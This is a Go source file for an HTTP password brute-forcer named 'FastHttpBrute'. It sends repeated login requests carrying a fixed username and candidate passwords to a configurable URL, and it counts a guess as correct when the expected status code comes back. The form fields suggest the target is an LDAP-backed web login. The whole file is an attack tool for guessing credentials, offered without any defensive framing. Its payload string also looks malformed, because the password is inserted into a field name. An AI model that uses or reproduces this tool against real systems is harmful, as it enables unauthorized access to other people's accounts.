package main

import (
	"fmt"
	"strings"

	"github.com/valyala/fasthttp"
)

type FastHttpBrute struct {
	Verb               string
	Url                string
	Username           string
	expectedStatusCode int
	Headers            map[string]string
}

func NewFastHttpBrute(verb, url, username string, expectedStatusCode int,
	headers map[string]string) *FastHttpBrute {
	return &FastHttpBrute{
		Url:                url,
		Verb:               strings.ToUpper(verb),
		Username:           username,
		expectedStatusCode: expectedStatusCode,
		Headers:            headers,
	}
}

func (c *FastHttpBrute) Do(password string) (bool, error) {
	payload := fmt.Sprintf("1_ldap-username=%s&1_ldap-secret%s0=[{}, \"$K1\"]", c.Username, password)

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(c.Url)
	req.Header.SetMethod(c.Verb)
	for k, v := range c.Headers {
		req.Header.Set(k, v)
	}
	req.SetBodyString(payload)

	client := &fasthttp.Client{}
	err := client.Do(req, resp)
	if err != nil {
		return false, err
	}

	return resp.StatusCode() == c.expectedStatusCode, nil
}
